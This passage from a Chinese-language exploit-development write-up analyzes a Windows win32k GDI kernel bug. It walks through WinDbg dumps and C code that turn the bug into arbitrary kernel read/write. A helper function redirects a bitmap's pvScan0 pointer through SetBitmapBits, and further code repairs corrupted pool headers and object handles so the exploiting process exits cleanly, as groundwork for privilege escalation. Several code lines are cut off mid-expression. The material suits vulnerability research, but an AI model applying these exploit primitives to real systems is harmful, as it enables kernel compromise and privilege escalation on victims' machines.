        TraceGreAcquireSemaphoreEx(L"hsem", *(_DWORD *)v2, 2);
      }
    }
清单 5-28 函数 NEEDGRELOCK::vLock 代码片段
问题就出在这里，`PDEVOBJ` 对象中的指针成员的值来源于当前表面对象的 `SURFACE->so.hdev`
成员域，该域的值要么是空，要么是指向某个实际设备对象的指针。默认情况下值为空，只是在前面的 `EDGE` 元素溢出访问的时候，被覆盖成了非空的值：
    kd> dc cae5eb70 l 10 
    cae5eb70  ffffffff ffffffff cae5df98 00000005  ................
    cae5eb80  00000000 00000000 ffffffff 00000300  ................
    cae5eb90  00000500 0147ae14 00000001 ffffffff  ......G.........
    cae5eba0  000002c4 cae5eccc cae5eccc 00000004  ................
清单 5-29 成员域 SURFACE->so.hdev 被覆盖成非空值
如上所示，内存地址 `0xcae5eb94` 位置是 `SURFACE->so.hdev` 成员域，已被覆盖成的 `0x147ae14`
数值显然不是某个实际设备对象的地址。接下来继续追查对该成员域进行覆盖的时机，最终定位到在 `vConstructGET` 函数中针对最后一组两点描述的边进行
`AddEdgeToGET` 函数调用并处理 `EDGE` 元素数据时，在函数中进行了如下判断和赋值：
      if ( iXWidth iXWhole 成员的赋值
根据前面的 `EDGE` 结构体定义可知，`pFreeEdge+0x1C` 字节偏移的域是 `iXWhole` 成员。针对当前两点描述的边，如果斜率大于
`1` 则将会给 `iXWhole` 域赋值为 `0`；否则会根据 `iXDirection` 成员的值是否为 `-1` 对 `iXWhole` 赋值为
`±(iXWidth/iYHeigth)`。
回过头来检查验证代码，发现按照当前代码逻辑，由于对坐标点数组赋初值的方法不当，导致最后一组两点描述的边的顶点坐标成为 `(0x6666668,0x5)` 和
`(0,0)`，这样一来在处理末尾的 `EDGE` 元素时，斜率就不可能大于 `1`，所以 `iXWhole`
成员才会赋值为非空值。所以修改验证代码对坐标点数组赋初值的代码逻辑：
    for (LONG i = 0; i so.hdev` 将不会被赋值为非空的值，在函数
`NEEDGRELOCK::vLock` 中判断指针成员的值时，遇空值将直接返回，不会进入 `PDEVOBJ::bAllowShareAccess`
函数调用，问题就得以解决。
    kd> dc cb06db70 l 10
    cb06db70  00000001 00000001 cb06db50 00000000  ........P.......
    cb06db80  00000001 00000000 fffffeff 00000100  ................
    cb06db90  00006400 00000000 00000001 ffffffff  .d..............
    cb06dba0  000002c4 cb06dccc cb06dccc 00000004  ................
清单 5-32 成员域 hdev 没有被覆盖成非空值
* * *
**定位扩展位图句柄**
得到主控位图表面对像的句柄之后，接下来需要通过该句柄控制其修改该位图表面对象所在内存块下一内存页中的位图表面对象作为扩展位图对象，修改其
`SURFACE->so.pvScan0` 成员域指向特定的地址，便可通过该扩展位图对象的句柄实现任意地址读写的目的。上面的验证代码中，命中成功时，变量
`pBmpHunted`
指向的缓冲区中存储的就是从当前位图表面对象的像素点数据区域起始地址开始的一整个内存页的数据，其中包括扩展位图表面对象的完整数据。接下来通过修改
`pBmpHunted` 指向的缓冲区中特定数据并通过调用 `SetBitmapBits`
函数将缓冲区写入当前位图表面对象，就可以实现对扩展位图对象的操纵。
图 5-10 主控位图对象访问的 0x1000 字节数据包含扩展位图对象的成员数据
当然，我们首先需要在位图句柄列表中定位出被用作扩展位图对象的位图表面对象所对应的句柄。说虽然在内核中当前位图表面对象与在下一内存页中分配的位图表面对象在内存布局方面相邻近，但在句柄表中两者先后顺序不一定相邻，所以我打算故技重施，先将扩展位图表面对象的
`sizlBitmap` 域修改为较大的值，再通过调用 `GetBitmapBits` 函数的方式遍历定位句柄。
我将前面通过 `GetBitmapBits` 函数获取到的从主控位图表面对象位图像素区域开始的整个内存页数据存放在分配的缓冲区中，并以 `DWORD`
指针的方式解析，将所有数据输出，通过与下一内存页中的扩展位图像素数据进行比对，成功在分配的缓冲区中找到了扩展位图对象的数据：
    [936]8769D520 [937]4684016E [938]35316847 [939]02050FC8
    [940]00000000 [941]00000000 [942]00000000 [943]00000000
    [944]02050FC8 [945]00000000 [946]00000000 [947]00000001
    [948]000000B1 [949]000002C4 [950]CB00FCCC [951]CB00FCCC
    [952]00000004 [953]00002D50 [954]00000006 [955]00010000
    [956]00000000 [957]04800200 [958]00000000 [959]00000000
    [960]00000000 [961]00000000 [962]00000000 [963]00000000
清单 5-33 分配的缓冲区数据的转储
其中，下标 `948` 的元素数值是扩展位图对象的 `SURFACE->so.sizlBitmap.cy` 成员域的值，下标 `951` 的元素数值是
`SURFACE->so.pvScan0` 成员域的值。那么接下来将修改下标 `948` 的元素数值并通过 `SetBitmapBits`
写入扩展位图对象，再通过遍历句柄表的方式定位出扩展位图对象的句柄。
* * *
**指哪打哪**
到目前为止，已定位到了主控位图表面对象和扩展位图表面对象。通过主控位图表面对象作为接口修改缓冲区中下标 `951`
的元素数值并写入内核，可控制扩展位图表面对象的 `SURFACE->so.pvScan0` 成员域的值，这样一来只要将扩展位图表面对象的
`SURFACE->so.pvScan0` 成员域修改为任意内核地址，便可轻松实现对内核任意地址的读写，“指哪打哪”的目的就实现了。
    BOOL xxPointToHit(LONG addr, PVOID pvBits, DWORD cb)
    {
        LONG ret = 0;
        pBmpHunted[iExtpScan0] = addr;
        ret = SetBitmapBits(hBmpHunted, 0x1000, pBmpHunted);
        if (ret so.pvScan0` 指针指向 `0xCB00FCCC` 地址，根据前面的分析数据可计算出扩展位图表面对象所在内存块的池头部位于
`0xCB00FB70` 地址，而同一页中剪贴板数据对象对象位于 `0xCB00F000` 地址。将这两个地址向前移 `0x1000`
一个内存页的大小就可以定位到主控位图表面对象所在内存页中受污染的内存块 `POOL_HEADER`
位置，随后依据“指哪打哪”方案，将前面获取的未被污染的池头部结构数据再写入对应类型的受污染的位置，这样一来释放这些内存块时就不会有问题了。
另外还需要注意的是，必须对数据受污染的位图表面对象和剪贴板数据对象的某些特定成员域的值进行修复，才能保证在销毁这些对象时能够顺利进行。
前面提到过 `_BASEOBJECT` 结构，它是所有内核 GDI 对象类的基类。这就意味着所有内核 GDI 对象的起始位置存储的都是一个
`_BASEOBJECT` 结构，位图表面对象也不例外。该结构的第一个成员变量 `HANDLE hmgr` 存储当前 GDI
对象的用户句柄，该句柄与用户进程调用的创建 GDI 对象的 API 返回的句柄一致。在销毁位图表面对象进行时，在函数
`SURFACE::bDeleteSurface` 中会获取该成员域的值，并传入 `HmgRemoveObject` 和 `HmgQueryAltLock`
等函数进行相关处理。另外句柄值同样被存储在成员域 `SURFACE->so.hsurf` 中。如果不对这些成员域的值进行修复，那么在销毁该 GDI
对象时，将会发生访问违例等不可预料的错误。好在我们在前面已定位并保存了主控位图表面对象的句柄，将句柄值写入这两个域所在内存地址即可。
      if ( !a3 && !HmgRemoveObject(*(HANDLE *)this, 0, 1, FreeSize == 2, 5) )
      {
        if ( HmgQueryAltLock(*(_DWORD *)this) == 1 )
        {
          ...
        }
        ...
      }
清单 5-35 函数 SURFACE::bDeleteSurface 访问 hmgr 成员
而对于位于同一内存页中被污染的剪贴板数据对象，由于该对象在当前活跃会话的生命周期内将不会被释放，所以就不需要对其被污染的成员域数据进行修复了。
    // calc base page address
    iMemHunted = (pBmpHunted[iExtpScan0] & ~0xFFF) - 0x1000;
    DWORD szInputBit[0x100] = { 0 }; // buffer
    CONST LONG iTrueCbdHead = 205;
    CONST LONG iTrueBmpHead = 937;
    szInputBit[0] = pBmpHunted[iTrueCbdHead + 0];
    szInputBit[1] = pBmpHunted[iTrueCbdHead + 1];
    // fix clibdata pool header
    ret = xxPointToHit(iMemHunted + 0x000, szInputBit, 0x08);
    if (!ret)
    {
        return 0;
    }
    szInputBit[0] = pBmpHunted[iTrueBmpHead + 0];
    szInputBit[1] = pBmpHunted[iTrueBmpHead + 1];
    // fix bitmap pool header
    ret = xxPointToHit(iMemHunted + 0xb70, szInputBit, 0x08);
    if (!ret)
    {
        return 0;
    }
    szInputBit[0] = (DWORD)hBmpHunted;
    // fix bitmap hmgr
    ret = xxPointToHit(iMemHunted + 0xb78, szInputBit, 0x04);
    if (!ret)
    {
        return 0;
    }
    // fix bitmap hsurf
    ret = xxPointToHit(iMemHunted + 0xb8c, szInputBit, 0x04);
    if (!ret)
    {
        return 0;
    }
清单 5-36 修复受损内存数据的验证代码片段
至此，对该漏洞利用的验证代码已实现任意内核地址读写和无异常退出进程的能力，下一章节将研究实现通过任意内核地址读写的能力实现内核提权的目的。
* * *